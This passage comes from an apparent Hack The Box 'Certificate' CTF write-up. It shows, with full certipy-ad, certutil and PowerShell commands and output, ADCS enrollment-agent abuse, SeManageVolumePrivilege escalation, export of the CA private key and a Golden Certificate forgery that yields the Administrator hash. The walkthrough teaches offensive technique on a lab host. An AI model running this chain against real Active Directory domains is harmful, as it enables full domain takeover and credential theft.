The exploitation unfolds as follows: I begin by requesting a certificate for the `lion.sk` account using the vulnerable `Delegated-CRA` template. Once obtained, this enrollment agent certificate is then used to authenticate a second certificate request, this time targeting the `ryan.k` user account with the `SignedUser` template.

```sh
(sn0x㉿sn0x)-[~/hackthebox/Certificate]
└─$ certipy-ad req -u lion.sk@certificate.htb \
                 -p '!QAZ2wsx' \
                 -target dc01.certificate.htb \
                 -ns 10.129.178.11 \
                 -ca Certificate-LTD-CA \
                 -template Delegated-CRA
Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
[*] Requesting certificate via RPC
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saving certificate and private key to 'lion.sk.pfx'
[*] Wrote certificate and private key to 'lion.sk.pfx'
 
$ certipy-ad req -u lion.sk@certificate.htb \
                 -p '!QAZ2wsx' \
                 -target dc01.certificate.htb \
                 -ns 10.129.178.11 \
                 -ca Certificate-LTD-CA \
                 -template SignedUser \
                 -pfx lion.sk.pfx \
                 -on-behalf-of 'CERTIFICATE\ryan.k'
Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
[*] Requesting certificate via RPC
[*] Request ID is 22
[*] Successfully requested certificate
[*] Got certificate with UPN 'ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx'
```

Due to the 8-hour time skew identified during reconnaissance, I utilize the `faketime` utility to synchronize with the target's clock before authenticating. Using certipy-ad with the Ryan K certificate (PFX format), I initiate authentication against the domain controller at `dc01.certificate.htb`.

The authentication process proceeds successfully through the following stages:

* Certificate identity validation confirms the UPN `ryan.k@certificate.htb` and security identifier
* A Ticket Granting Ticket is successfully obtained from the KDC
* The credential cache is written to `ryan.k.ccache`
* NT hash extraction yields: `b1bc3d70e70f4f36b1509a65ae1a2ae6`

```sh
(sn0x㉿sn0x)-[~/hackthebox/Certificate]
└─$ faketime -f +8h certipy-ad auth -pfx ryan.k.pfx \
                                  -ns 10.129.178.11 \
                                  -dc dc01.certificate.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
[*] Certificate identities:
[*]     SAN UPN: 'ryan.k@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.k.ccache'
[*] Wrote credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
```

With `ryan.k` being a member of the `Remote Management Users` group, I am able to authenticate and obtain an interactive shell on the target system using evil-winrm.

Upon examining the complete group membership structure for the `ryan.k` account, I identify participation in an additional security group of interest: `Domain Storage Managers`. This group assignment is particularly noteworthy as it confers the `SeManageVolumePrivilege` privilege, which permits performing volume maintenance tasks and may present opportunities for privilege escalation.

<pre class="language-bash"><code class="lang-bash">PS > whoami /all
 
USER INFORMATION
----------------
 
User Name          SID
================== =============================================
certificate\ryan.k S-1-5-21-515537669-4223687196-3249690583-1117
 
 
GROUP INFORMATION
-----------------
 
Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
<strong>CERTIFICATE\Domain Storage Managers        Group            S-1-5-21-515537669-4223687196-3249690583-1118 Mandatory group, Enabled by default, Enabled group
</strong>NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 
 
PRIVILEGES INFORMATION
----------------------
 
Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
<strong>SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
</strong>SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
 
 
USER CLAIMS INFORMATION
-----------------------
 
User claims unknown.
 
Kerberos support for Dynamic Access Control on this device has been disabled.
</code></pre>

A quick search for exploitation methods targeting `SeManageVolumePrivilege` reveals SeManageVolumeAbuse, a proof-of-concept tool designed to abuse this privilege by granting full control permissions over the `C` drive to the executing user.

After compiling the exploit and running it on the target system, the privilege escalation is successful—I now have unrestricted access to the majority of the file system, including directories typically restricted to administrative users. However, when attempting to read the final flag, access is denied. Investigation reveals that the flag file has been protected with encryption, preventing direct access even with elevated file system permissions.

```bash
PS > & SeManageVolumeAbuse.exe
Success! Permissions changed.
 
PS > (Get-Item C:\Users\Administrator\Desktop\root.txt).Attributes
ReadOnly, Archive, Encrypted

```

Since certificate authentication is actively deployed within the environment, I shift focus toward compromising the certificate authority itself. By executing the `certutil -store` command, I enumerate all certificates present in the system's certificate store.

The output reveals the enterprise certificate authority `Certificate-LTD-CA`, which serves as the root CA responsible for signing and issuing certificates throughout the domain. This CA represents a high-value target, as compromising it would enable the forging of arbitrary certificates for any domain user or service.

```bash
PS > certutil -store
CA "Intermediate Certification Authorities"
================ Certificate 0 ================
Serial Number: 06376c00aa00648a11cfb8d4aa5c35f4
Issuer: CN=Root Agency
 NotBefore: 5/28/1996 3:02 PM
 NotAfter: 12/31/2039 4:59 PM
Subject: CN=Root Agency
Signature matches Public Key
Root Certificate: Subject matches Issuer
Cert Hash(sha1): fee449ee0e3965a5246f000e87fde2a065fd89d4
No key provider information
Cannot find the certificate and private key for decryption.
 
================ Certificate 1 ================
Serial Number: 46fcebbab4d02f0f926098233f93078f
Issuer: OU=Class 3 Public Primary Certification Authority, O=VeriSign, Inc., C=US
 NotBefore: 4/16/1997 5:00 PM
 NotAfter: 10/24/2016 4:59 PM
Subject: OU=www.verisign.com/CPS Incorp.by Ref. LIABILITY LTD.(c)97 VeriSign, OU=VeriSign International Server CA - Class 3, OU=VeriSign, Inc., O=VeriSign Trust Network
Non-root Certificate
Cert Hash(sha1): d559a586669b08f46a30a133f8a9ed3d038e2ea8
No key provider information
Cannot find the certificate and private key for decryption.
 
================ Certificate 2 ================
Serial Number: 472cb6148184a9894f6d4d2587b1b165
Issuer: CN=certificate-DC01-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:30 PM
 NotAfter: 11/3/2029 3:40 PM
Subject: CN=certificate-DC01-CA, DC=certificate, DC=htb
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Cert Hash(sha1): 82ad1e0c20a332c8d6adac3e5ea243204b85d3a7
No key provider information
  Provider = Microsoft Software Key Storage Provider
  Simple container name: certificate-DC01-CA
  Unique container name: 6f761f351ca79dc7b0ee6f07b40ae906_7989b711-2e3f-4107-9aae-fb8df2e3b958
  ERROR: missing key association property: CERT_KEY_IDENTIFIER_PROP_ID
Signature test passed
 
================ Certificate 3 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
No key provider information
  Provider = Microsoft Software Key Storage Provider
  Simple container name: Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  ERROR: missing key association property: CERT_KEY_IDENTIFIER_PROP_ID
Signature test passed
 
================ Certificate 4 ================
Serial Number: 198b11d13f9a8ffe69a0
Issuer: CN=Microsoft Root Authority, OU=Microsoft Corporation, OU=Copyright (c) 1997 Microsoft Corp.
 NotBefore: 10/1/1997 12:00 AM
 NotAfter: 12/31/2002 12:00 AM
Subject: CN=Microsoft Windows Hardware Compatibility, OU=Microsoft Corporation, OU=Microsoft Windows Hardware Compatibility Intermediate CA, OU=Copyright (c) 1997 Microsoft Corp.
Non-root Certificate
Cert Hash(sha1): 109f1caed645bb78b3ea2b94c0697c740733031c
No key provider information
Cannot find the certificate and private key for decryption.
 
--- SNIP ---
```

The `certutil` utility also provides functionality to export certificates along with their private keys to a PFX file format. By specifying the serial number `75b2f4bbf31f108945147b466131bdca`, I can extract the certificate authority's complete certificate and private key material.

It's worth noting that this export operation would ordinarily fail due to insufficient access permissions on the certificate store. However, the previously obtained `SeManageVolumePrivilege` exploitation has granted the necessary file system rights to successfully access and export the protected certificate data.

```bash
PS > certutil -exportPFX MY 75b2f4bbf31f108945147b466131bdca backup.pfx
MY "Personal"
================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file backup.pfx:
Enter new password:
Confirm new password:
CertUtil: -exportPFX command completed successfully.
```

Utilizing the built-in file transfer capabilities provided by evil-winrm, I download the exported PFX file from the target system to my attack host. With the certificate authority's private key now in my possession, I can forge arbitrary certificates for any domain account.

I supply the PFX file to certipy-ad, instructing it to generate a fraudulent certificate for the `Administrator` account. This technique, known as a "Golden Certificate" attack, allows me to create valid certificates that appear legitimately signed by the compromised certificate authority. Once the forged certificate is generated, I use it to authenticate as `Administrator`, effectively gaining complete control over the domain without needing the actual account password.

```
(sn0x㉿sn0x)-[~/hackthebox/Certificate]
└─$ certipy-ad forge -ca-pfx backup.pfx \
                   -upn Administrator@certificate.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
[*] Saving forged certificate and private key to 'administrator_forged.pfx'
[*] Wrote forged certificate and private key to 'administrator_forged.pfx'
 
$ faketime -f +8h certipy-ad auth -pfx administrator_forged.pfx -dc-ip 10.129.178.11
Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
[*] Certificate identities:
[*]     SAN UPN: 'Administrator@certificate.htb'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```

